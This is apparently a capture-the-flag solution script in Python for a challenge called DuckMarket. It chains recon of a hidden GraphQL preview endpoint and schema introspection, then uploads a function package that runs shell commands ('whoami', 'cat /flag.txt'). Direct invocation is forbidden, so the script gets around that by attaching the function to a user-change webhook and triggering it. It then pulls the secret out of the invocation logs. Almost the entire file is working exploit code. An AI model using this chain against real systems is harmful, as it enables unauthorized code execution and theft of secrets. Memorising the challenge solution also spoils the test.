#!/usr/bin/env python3
"""DuckMarket end-to-end reproduction script.

Automates the full chain: recon -> function creation -> package upload ->
provisioning -> (blocked) direct invocation -> webhook configuration ->
profile-update trigger -> invocation log extraction.

Usage:
    python3 solution/solve.py [--base-url http://localhost:4000]

Requires only the Python standard library (urllib, zipfile, io, re).
"""

import argparse
import io
import json
import re
import time
import urllib.error
import urllib.request
import uuid
import zipfile


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://localhost:4000")
    parser.add_argument("--email", default="daffy@duckurity.example")
    parser.add_argument("--password", default="DuckSeason2024!")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")
    state = {"session": None, "csrf": None, "user": None}

    def call(path, method="GET", body=None, data=None, headers=None, retry_auth=True):
        hdrs = dict(headers or {})
        if state.get("session"):
            hdrs["Cookie"] = f"SESSIONID={state['session']}"
        if body is not None:
            hdrs["Content-Type"] = "application/json"
            payload = json.dumps(body).encode()
        elif data is not None:
            payload = data
        else:
            payload = None
        if payload is not None and state.get("csrf"):
            hdrs["X-XSRF-TOKEN"] = state["csrf"]
        req = urllib.request.Request(base + path, data=payload, method=method, headers=hdrs)
        try:
            resp = urllib.request.urlopen(req, timeout=20)
            set_cookies = resp.headers.get_all("Set-Cookie") or []
            for sc in set_cookies:
                pair = sc.split(";", 1)[0]
                if "=" not in pair:
                    continue
                name, value = pair.split("=", 1)
                if name.strip() == "SESSIONID":
                    state["session"] = value.strip()
                if name.strip() == "XSRF-TOKEN":
                    state["csrf"] = value.strip()
            return resp.status, json.loads(resp.read().decode() or "null")
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read().decode() or "null")

    def gql(query, variables=None):
        body = {"query": query}
        if variables is not None:
            body["variables"] = variables
        return call("/api/graphql/preview", method="POST", body=body)

    print("[*] DuckMarket reproduction script")
    print()

    # --- 1. login ------------------------------------------------------------
    print("[1] Logging in as the standard user")
    status, body = call(
        "/api/auth/login",
        method="POST",
        body={"email": args.email, "password": args.password},
    )
    assert status == 200, f"login failed: {status} {body}"
    state["user"] = body["user"]
    print(f"    session established for {state['user']['email']} (role {state['user']['role']})")

    # --- 2. recon -------------------------------------------------------------
    print("[2] Storefront bundle reconnaissance")
    status, html = None, None
    with urllib.request.urlopen(base + "/", timeout=20) as resp:
        html = resp.read().decode()
    asset = re.search(r'src="(/assets/app\.js)"', html).group(1)
    with urllib.request.urlopen(base + asset, timeout=20) as resp:
        bundle = resp.read().decode()
    endpoint = re.search(r'previewEndpoint:\s*"([^"]+)"', bundle).group(1)
    print(f"    found preview endpoint in JS config: {endpoint}")

    # --- 3. introspection ------------------------------------------------------
    print("[3] Introspecting the preview schema")
    status, body = gql(
        """
        {
          __schema {
            mutationType { name }
            types { name kind }
          }
        }
        """
    )
    names = {t["name"] for t in body["data"]["__schema"]["types"]}
    assert "AccountFunction" in names and "WebhookConfiguration" in names
    print("    discovered AccountFunction / WebhookConfiguration types")

    # --- 4. create function ----------------------------------------------------
    print("[4] createAccountFunction")
    fn_name = f"repro-{uuid.uuid4().hex[:8]}"
    status, body = gql(
        """
        mutation($i: CreateAccountFunctionInput!) {
          createAccountFunction(input: $i) {
            accountFunction {
              id
              status
              codeFile { __typename ... on StagedFile { uploadLink } }
            }
            userErrors { message }
          }
        }
        """,
        {"i": {"name": fn_name, "codeFileName": "package.zip", "active": True}},
    )
    payload = body["data"]["createAccountFunction"]
    assert not payload["userErrors"], payload["userErrors"]
    fn = payload["accountFunction"]
    upload_link = fn["codeFile"]["uploadLink"]
    print(f"    function {fn['id']} created (status {fn['status']})")
    print(f"    upload link: {upload_link}")

    # --- 5. build + upload package ----------------------------------------------
    print("[5] Building and uploading the function package")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(
            "package.json",
            json.dumps({"name": fn_name, "version": "1.0.0", "main": "index.js"}),
        )
        z.writestr(
            "index.js",
            "const { execSync } = require('child_process');\n"
            "exports.handler = async (event, ctx) => {\n"
            "  console.log('whoami: ' + execSync('whoami').toString().trim());\n"
            "  console.log('runtime: ' + process.version);\n"
            "  console.log('secret: ' + execSync('cat /flag.txt').toString().trim());\n"
            "  return { ok: true };\n"
            "};\n",
        )
    status, body = call(
        upload_link,
        method="PUT",
        data=buf.getvalue(),
        headers={"Content-Type": "application/zip"},
    )
    assert status == 202, f"upload failed: {status} {body}"
    print("    package accepted; provisioning started")

    # --- 6. wait for READY -------------------------------------------------------
    print("[6] Waiting for provisioning")
    for _ in range(40):
        time.sleep(0.5)
        status, body = gql(
            "query($id: ID!){ function(id: $id){ status runtime } }",
            {"id": fn["id"]},
        )
        f = body["data"]["function"]
        if f["status"] == "READY":
            print(f"    READY on runtime {f['runtime']}")
            break
        if f["status"] == "FAILED":
            raise SystemExit("provisioning FAILED unexpectedly")
    else:
        raise SystemExit("provisioning never reached READY")

    # --- 7. blocked direct invocation (the dead end) -----------------------------
    print("[7] Attempting direct invokeFunction (expected to be rejected)")
    status, body = gql(
        "mutation($id: ID!){ invokeFunction(id: $id){ invocation { id } userErrors { message } } }",
        {"id": fn["id"]},
    )
    payload = body["data"]["invokeFunction"]
    messages = [ue["message"] for ue in payload["userErrors"]]
    print(f"    FORBIDDEN response: {json.dumps(messages)}")
    assert any("FORBIDDEN" in m for m in messages), "expected FORBIDDEN here"
    print("    -> direct execution is correctly gated for this account")

    # --- 8. webhook configuration --------------------------------------------------
    print("[8] createAccountWebhookConfiguration with a function destination")
    status, body = gql(
        """
        mutation($i: CreateAccountWebhookConfigurationInput!) {
          createAccountWebhookConfiguration(input: $i) {
            webhookConfiguration { id status destination { functionId } }
            userErrors { message }
          }
        }
        """,
        {
            "i": {
                "resourceType": "USER",
                "resourceActions": ["CHANGED"],
                "destination": {"functionId": fn["id"]},
            }
        },
    )
    payload = body["data"]["createAccountWebhookConfiguration"]
    assert not payload["userErrors"], payload["userErrors"]
    wc = payload["webhookConfiguration"]
    print(f"    webhook {wc['id']} is {wc['status']} (destination function {wc['destination']['functionId']})")

    # --- 9. trigger via profile update ------------------------------------------------
    print("[9] Triggering USER_CHANGED via profile update")
    uuid_ = state["user"]["id"]
    status, body = call(
        f"/api/account/v2/users/{uuid_}",
        method="PUT",
        body={"firstName": state["user"]["firstName"], "locale": "en-GB"},
    )
    assert status == 200, f"profile update failed: {status} {body}"
    print("    profile updated; waiting for the event pipeline")

    # --- 10. collect invocation logs ------------------------------------------------------
    print("[10] Polling lastInvocation for the execution logs")
    flag = None
    for _ in range(40):
        time.sleep(0.5)
        status, body = gql(
            """
            query($id: ID!){
              function(id: $id){
                lastInvocation { successful startedOn logs { timestamp message } }
              }
            }
            """,
            {"id": fn["id"]},
        )
        li = body["data"]["function"]["lastInvocation"]
        if li and li.get("logs"):
            for entry in li["logs"]:
                print(f"    [{entry['timestamp']}] {entry['message']}")
            joined = "\n".join(e["message"] for e in li["logs"])
            m = re.search(r"DUCK\{[^}]+\}", joined)
            if m:
                flag = m.group(0)
            break

    if not flag:
        raise SystemExit("execution ran but no secret was recovered from the logs")

    print()
    print(f"[+] Recovered secret: {flag}")
    return flag


if __name__ == "__main__":
    main()
